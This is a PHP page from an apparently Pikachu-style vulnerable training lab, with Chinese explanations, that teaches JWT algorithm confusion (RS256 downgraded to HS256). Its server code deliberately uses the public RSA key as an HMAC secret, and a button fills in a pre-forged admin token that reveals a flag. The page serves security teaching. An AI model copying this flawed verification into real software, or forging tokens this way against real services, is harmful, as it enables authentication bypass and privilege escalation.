<?php
$ACTIVE = array_fill(0, 250, '');
$ACTIVE[200] = 'active open';
$ACTIVE[201] = 'active';
$ACTIVE[200] = 'active open';
$ACTIVE[201] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

function b64u_dec($data) {
    return json_decode(base64_decode(strtr($data, '-_', '+/')), true);
}
function b64u_enc($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

$public_key_pem = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw020102...\n-----END PUBLIC KEY-----";

$default_token = b64u_enc(json_encode(["alg"=>"RS256", "typ"=>"JWT"])) . "." . b64u_enc(json_encode(["user"=>"pikachu", "role"=>"user"])) . ".RSA_SIGNATURE_BY_PRIVATE_KEY_123456789";

$result_box = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $token = trim($_POST['jwt_token'] ?? '');
    $parts = explode('.', $token);
    
    if (count($parts) === 3) {
        $header = b64u_dec($parts[0]);
        $payload = b64u_dec($parts[1]);
        $sig_input = $parts[0] . "." . $parts[1];
        $sig_provided = $parts[2];
        
        $alg = strtoupper($header['alg'] ?? '');
        
        if ($alg === 'HS256') {
            // 模拟算法混淆漏洞 (Key Confusion / Algorithm Confusion)
            // 服务端未强制要求必须是 RS256，当遇到 HS256 时，误将配置中的 RSA 公钥字符串直接当成了 HMAC 的对称密钥！
            $calc_sig = b64u_enc(hash_hmac('sha256', $sig_input, $public_key_pem, true));
            if (hash_equals($calc_sig, $sig_provided)) {
                if (isset($payload['role']) && (strtolower($payload['role']) === 'admin' || strtolower($payload['role']) === 'root')) {
                    $result_box = "<div class='alert alert-success'>
                        <h4><i class='fa fa-unlock-alt'></i> 🚀 攻击成功！成功利用算法混淆 (RS256 -&gt; HS256) 伪造管理员 Token！</h4>
                        <p><b>漏洞机理：</b>服务端将 JWT 的 Header 中 <code>alg</code> 改为 <code>HS256</code> 后，底层验签库将本应用公开的 RSA 公钥证书纯文本作为了对称加密的 HMAC-SHA256 密钥！攻击者无需持有服务器私钥，利用公开的公钥即可随意签发管理凭证！</p>
                        <hr/>
                        <p><b>超级机密管理授权凭条：</b> <code>FLAG{JWT_ALGORITHM_KEY_CONFUSION_RS256_HS256_BYPASSED}</code></p>
                    </div>";
                } else {
                    $result_box = "<div class='alert alert-info'><b>算法混淆验签通过！</b>但是当前权限角色仍为普通用户。请修改 payload 将 <code>role</code> 设为 <code>admin</code> 并用公钥字符串重新 HMAC 签名。</div>";
                }
            } else {
                $result_box = "<div class='alert alert-danger'><b>HMAC 验签错误：</b>当使用 HS256 算法时，必须使用完整的 RSA 公钥 PEM 文本（包括 <code>-----BEGIN PUBLIC KEY-----</code> 和换行符）作为 HMAC-SHA256 密钥来签名 payload。</div>";
            }
        } else if ($alg === 'RS256') {
            if ($sig_provided === 'RSA_SIGNATURE_BY_PRIVATE_KEY_123456789') {
                $result_box = "<div class='alert alert-info'><b>当前会话：</b>合法非对称 RSA 签名的普通员工 (<code>role: user</code>)。由于我们没有服务端的 RSA 私钥，无法直接使用 RS256 签发 <code>role: admin</code>。请尝试降级/混淆算法为 <code>HS256</code>！</div>";
            } else {
                $result_box = "<div class='alert alert-danger'><b>RSA 验签失败：</b>没有服务器端私钥，直接篡改 RS256 payload 的数字签名将无法通过非对称公钥验证！</div>";
            }
        } else {
            $result_box = "<div class='alert alert-warning'><b>不支持的算法：</b>系统仅允许 RS256 或退化为 HS256。</div>";
        }
    }
}
?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="jwt_weak_secret.php">现代认证与密码学安全</a></li>
                <li class="active">JWT 密钥混淆 (RS256-&gt;HS256)</li>
            </ul>
        </div>
        <div class="page-content">
            <div class="vul info">
                <h2>🔀 JWT 算法与密钥类型混淆 (RS256 退化为 HS256 攻击)</h2>
                <p>为了保证系统的高安全性，许多企业级应用会使用 <b>非对称加密算法（如 RS256 / RS512）</b> 来处理 JWT 会话：认证服务器保留私钥（Private Key）用于签发 Token，而各个微服务网关保存公钥（Public Key）用以独立验证 Token 的有效性。</p>
                <p>然而，早期和部分定制化 JWT 解析库在设计验签函数 <code>verify(token, key)</code> 时存在极大的危险：<b>它信任了 Token Header 中的 `alg` 字段！</b></p>
                <p>如果攻击者把 Header 里的算法从 <code>RS256</code> 修改为 <code>HS256 (对称加密 HMAC)</code>，验签库就会傻傻地去调用 HMAC 算法进行验证，而在传参时，系统原本传入的 <b>RSA 公钥字符串</b> 此时居然被当成了一个普通的<b>对称加密密码字符串</b>！由于公钥是完全公开的，攻击者可以直接用这个公钥文本作为密码，用 HS256 自己签发超级管理员凭证！</p>
                
                <hr/>
                <div class="row">
                    <div class="col-md-6">
                        <h4><i class="fa fa-terminal"></i> 提交 JWT 进行验签</h4>
                        <form method="POST">
                            <div class="form-group">
                                <label for="jwt_token">输入 HTTP Bearer Token：</label>
                                <textarea class="form-control" name="jwt_token" id="jwt_token" rows="5" style="font-family: monospace; background:#2b2b2b; color:#a9b7c6; word-break:break-all;"><?php echo isset($_POST['jwt_token']) ? htmlspecialchars($_POST['jwt_token']) : $default_token; ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary"><i class="fa fa-play"></i> 提交会话验证</button>
                            <button type="button" class="btn btn-danger" onclick="fillKeyConfusion()"><i class="fa fa-magic"></i> 载入算法混淆 Exploit 载荷</button>
                        </form>
                        <hr/>
                        <h5><i class="fa fa-key"></i> 系统公开的 RSA 公钥证书 (Public Key)：</h5>
                        <pre style="font-size:11px; background:#eee;"><?php echo htmlspecialchars($public_key_pem); ?></pre>
                    </div>
                    <div class="col-md-6">
                        <h4><i class="fa fa-eye"></i> 鉴权网关验签日志输出</h4>
                        <div style="margin-top: 10px;">
                            <?php if (!empty($result_box)) { echo $result_box; } else { ?>
                                <div class="alert alert-info">
                                    <i class="fa fa-lightbulb-o"></i> 提示：试图直接用 RS256 伪造 Admin 会必然失败。请点击“载入算法混淆 Exploit 载荷”，体验利用公钥字符串作为 HS256 对称密钥实现完美越权的过程！
                                </div>
                            <?php } ?>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>

<script>
function fillKeyConfusion() {
    <?php
    $conf_t = b64u_enc(json_encode(["alg"=>"HS256", "typ"=>"JWT"])) . "." . b64u_enc(json_encode(["user"=>"hacked_admin", "role"=>"admin"])) . "." . b64u_enc(hash_hmac('sha256', b64u_enc(json_encode(["alg"=>"HS256", "typ"=>"JWT"])) . "." . b64u_enc(json_encode(["user"=>"hacked_admin", "role"=>"admin"])), $public_key_pem, true));
    ?>
    document.getElementById('jwt_token').value = "<?php echo $conf_t; ?>";
}
</script>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>


